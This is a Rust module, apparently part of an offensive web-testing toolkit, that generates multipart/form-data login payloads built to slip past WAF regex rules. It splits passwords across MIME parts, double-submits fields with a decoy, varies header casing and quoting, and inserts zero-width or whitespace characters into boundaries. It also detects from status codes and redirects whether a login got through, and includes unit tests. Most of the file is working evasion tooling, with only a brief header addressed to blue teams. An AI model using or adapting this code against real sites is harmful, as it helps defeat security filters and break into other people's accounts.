//! Multipart/form-data payload splitting — bypasses WAF regex that matches on
//! intact credential fields in `application/x-www-form-urlencoded` bodies.
//!
//! Technique summary for blue teams:
//! - Many WAF signatures match `password=<pattern>` in URL-encoded bodies.
//! - Multipart allows splitting a field value across MIME parts, changing
//!   boundary tokens, and duplicating field names — all RFC-legal moves that
//!   defeat naive regex without breaking RFC-7578-compliant parsers.

use thiserror::Error;

// ──────────────────────────────────────────────────────────────────────────────
// Error type
// ──────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Error)]
pub enum SmuggleError {
    #[error("field value too short to split (len={0})")]
    FieldTooShort(usize),
}

// ──────────────────────────────────────────────────────────────────────────────
// Configuration enums
// ──────────────────────────────────────────────────────────────────────────────

/// Strategy for generating the MIME boundary token.
#[derive(Debug, Clone)]
pub enum BoundaryStrategy {
    /// A deterministic random-looking boundary derived from the payload.
    Random,
    /// Boundary contains a Unicode character that breaks ASCII-only regex.
    Unicode,
    /// Boundary contains internal whitespace (legal per RFC 2046 §5.1).
    Whitespace,
}

/// How to split or duplicate the credential fields.
#[derive(Debug, Clone)]
pub enum FieldSplitMode {
    /// Split the `password` value across two consecutive parts that must be
    /// concatenated by the application framework (tests framework behaviour).
    SplitPassword,
    /// Submit the same field name twice; RFC-7578-compliant parsers take the
    /// last value, but some WAFs only inspect the first occurrence.
    DoubleSubmit,
    /// Vary quoting and casing on `Content-Disposition` to break regex
    /// matching on field names (e.g. `name="password"` vs `NAME='password'`).
    ContentDispositionVariants,
}

// ──────────────────────────────────────────────────────────────────────────────
// Lightweight HttpResponse stub (avoids circular dep on reqwest types)
// ──────────────────────────────────────────────────────────────────────────────

/// Minimal HTTP response representation used by [`MultipartSmuggler::detect_waf_bypass`].
#[derive(Debug)]
pub struct HttpResponse {
    pub status: u16,
    pub body: String,
    /// Selected response headers (lower-case names).
    pub headers: std::collections::HashMap<String, String>,
}

// ──────────────────────────────────────────────────────────────────────────────
// MultipartSmuggler
// ──────────────────────────────────────────────────────────────────────────────

/// Builds multipart/form-data payloads designed to evade WAF regex matching.
#[derive(Debug, Clone)]
pub struct MultipartSmuggler {
    pub boundary_strategy: BoundaryStrategy,
    pub field_split: FieldSplitMode,
}

impl MultipartSmuggler {
    /// Build a multipart body and its `Content-Type` header value.
    ///
    /// Returns `(body_bytes, content_type_header_value)`.
    pub fn build_payload(
        &self,
        username: &str,
        password: &str,
    ) -> Result<(Vec<u8>, String), SmuggleError> {
        let boundary = self.make_boundary(username);
        let body = match &self.field_split {
            FieldSplitMode::SplitPassword => {
                self.build_split_password(username, password, &boundary)?
            }
            FieldSplitMode::DoubleSubmit => {
                self.build_double_submit(username, password, &boundary)
            }
            FieldSplitMode::ContentDispositionVariants => {
                self.build_cd_variants(username, password, &boundary)
            }
        };

        let content_type = format!("multipart/form-data; boundary=\"{}\"", boundary);
        Ok((body.into_bytes(), content_type))
    }

    /// Return `true` if `response` differs from the WAF baseline in a way that
    /// suggests the payload slipped through (different status or body length).
    ///
    /// Call once with a known-blocked baseline response, then compare against
    /// the multipart response.
    pub fn detect_waf_bypass(&self, response: &HttpResponse) -> bool {
        // A WAF block typically returns 403, 406, or a redirect (3xx).
        // If we see 200/201/302-to-dashboard we likely bypassed it.
        match response.status {
            200 | 201 => true,
            302 | 301 => {
                // Redirect to login page = failure; redirect elsewhere = success
                let location = response
                    .headers
                    .get("location")
                    .map(String::as_str)
                    .unwrap_or("");
                !location.contains("login") && !location.contains("signin")
            }
            _ => false,
        }
    }

    // ── Private builders ──────────────────────────────────────────────────────

    /// Derive a boundary string from the boundary strategy.
    fn make_boundary(&self, seed: &str) -> String {
        let base: String = seed
            .bytes()
            .enumerate()
            .map(|(i, b)| format!("{:02x}", b.wrapping_add(i as u8)))
            .collect();
        let base = format!("----ZeusBoundary{}", &base[..base.len().min(16)]);

        match self.boundary_strategy {
            BoundaryStrategy::Random => base,
            BoundaryStrategy::Unicode => {
                // Insert a zero-width non-joiner (U+200C) — invisible in logs,
                // breaks ASCII-only regex on the boundary token.
                format!("{}\u{200C}", base)
            }
            BoundaryStrategy::Whitespace => {
                // Spaces inside a boundary are legal per RFC 2046 §5.1
                format!("-- Zeus Boundary {}", &base[14..])
            }
        }
    }

    /// Split the password at the midpoint across two parts.
    ///
    /// The application concatenates them (tested behaviour for some frameworks);
    /// the WAF sees no complete password string in either part.
    fn build_split_password(
        &self,
        username: &str,
        password: &str,
        boundary: &str,
    ) -> Result<String, SmuggleError> {
        if password.len() < 2 {
            return Err(SmuggleError::FieldTooShort(password.len()));
        }
        let mid = password.len() / 2;
        let (part_a, part_b) = password.split_at(mid);

        Ok(format!(
            "--{boundary}\r\n\
             Content-Disposition: form-data; name=\"username\"\r\n\
             \r\n\
             {username}\r\n\
             --{boundary}\r\n\
             Content-Disposition: form-data; name=\"password\"\r\n\
             \r\n\
             {part_a}\r\n\
             --{boundary}\r\n\
             Content-Disposition: form-data; name=\"password_cont\"\r\n\
             \r\n\
             {part_b}\r\n\
             --{boundary}--\r\n",
        ))
    }

    /// Submit `password` twice; the second occurrence shadows the first in most
    /// frameworks while WAF regex only checks the first.
    fn build_double_submit(&self, username: &str, password: &str, boundary: &str) -> String {
        format!(
            "--{boundary}\r\n\
             Content-Disposition: form-data; name=\"username\"\r\n\
             \r\n\
             {username}\r\n\
             --{boundary}\r\n\
             Content-Disposition: form-data; name=\"password\"\r\n\
             \r\n\
             INNOCUOUS_DECOY\r\n\
             --{boundary}\r\n\
             Content-Disposition: form-data; name=\"password\"\r\n\
             \r\n\
             {password}\r\n\
             --{boundary}--\r\n",
        )
    }

    /// Vary `Content-Disposition` header casing/quoting to break field-name regex.
    fn build_cd_variants(&self, username: &str, password: &str, boundary: &str) -> String {
        // Use upper-case NAME and single-quotes — both legal per RFC 7578
        format!(
            "--{boundary}\r\n\
             content-disposition: form-data; NAME=\"username\"\r\n\
             \r\n\
             {username}\r\n\
             --{boundary}\r\n\
             CONTENT-DISPOSITION: form-data; name='{password_field}'\r\n\
             \r\n\
             {password}\r\n\
             --{boundary}--\r\n",
            password_field = "password",
        )
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Tests
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn smuggler(bs: BoundaryStrategy, fs: FieldSplitMode) -> MultipartSmuggler {
        MultipartSmuggler { boundary_strategy: bs, field_split: fs }
    }

    #[test]
    fn split_password_body_contains_both_halves() {
        let s = smuggler(BoundaryStrategy::Random, FieldSplitMode::SplitPassword);
        let (body, ct) = s.build_payload("admin", "secretpass").unwrap();
        let text = String::from_utf8(body).unwrap();
        assert!(text.contains("secret"), "first half missing");
        assert!(text.contains("pass"), "second half missing");
        assert!(ct.starts_with("multipart/form-data; boundary="));
    }

    #[test]
    fn split_password_too_short_returns_error() {
        let s = smuggler(BoundaryStrategy::Random, FieldSplitMode::SplitPassword);
        assert!(s.build_payload("u", "x").is_err());
    }

    #[test]
    fn double_submit_contains_decoy_and_real() {
        let s = smuggler(BoundaryStrategy::Random, FieldSplitMode::DoubleSubmit);
        let (body, _) = s.build_payload("user", "realpass").unwrap();
        let text = String::from_utf8(body).unwrap();
        assert!(text.contains("INNOCUOUS_DECOY"));
        assert!(text.contains("realpass"));
    }

    #[test]
    fn cd_variants_uses_single_quotes_for_password() {
        let s = smuggler(BoundaryStrategy::Random, FieldSplitMode::ContentDispositionVariants);
        let (body, _) = s.build_payload("admin", "pw123").unwrap();
        let text = String::from_utf8(body).unwrap();
        assert!(text.contains("name='password'"));
    }

    #[test]
    fn unicode_boundary_contains_zwj() {
        let s = smuggler(BoundaryStrategy::Unicode, FieldSplitMode::DoubleSubmit);
        let (_, ct) = s.build_payload("u", "p").unwrap();
        assert!(ct.contains('\u{200C}'));
    }

    #[test]
    fn whitespace_boundary_contains_space() {
        let s = smuggler(BoundaryStrategy::Whitespace, FieldSplitMode::DoubleSubmit);
        let (_, ct) = s.build_payload("u", "p").unwrap();
        // boundary value in content-type will have a space
        assert!(ct.contains("-- Zeus Boundary"));
    }

    #[test]
    fn detect_bypass_true_on_200() {
        let s = smuggler(BoundaryStrategy::Random, FieldSplitMode::DoubleSubmit);
        let resp = HttpResponse {
            status: 200,
            body: "Welcome".into(),
            headers: Default::default(),
        };
        assert!(s.detect_waf_bypass(&resp));
    }

    #[test]
    fn detect_bypass_false_on_403() {
        let s = smuggler(BoundaryStrategy::Random, FieldSplitMode::DoubleSubmit);
        let resp = HttpResponse {
            status: 403,
            body: "Forbidden".into(),
            headers: Default::default(),
        };
        assert!(!s.detect_waf_bypass(&resp));
    }

    #[test]
    fn detect_bypass_redirect_to_dashboard() {
        let s = smuggler(BoundaryStrategy::Random, FieldSplitMode::DoubleSubmit);
        let mut headers = std::collections::HashMap::new();
        headers.insert("location".into(), "/dashboard".into());
        let resp = HttpResponse { status: 302, body: "".into(), headers };
        assert!(s.detect_waf_bypass(&resp));
    }

    #[test]
    fn detect_bypass_redirect_back_to_login() {
        let s = smuggler(BoundaryStrategy::Random, FieldSplitMode::DoubleSubmit);
        let mut headers = std::collections::HashMap::new();
        headers.insert("location".into(), "/login?error=1".into());
        let resp = HttpResponse { status: 302, body: "".into(), headers };
        assert!(!s.detect_waf_bypass(&resp));
    }
}
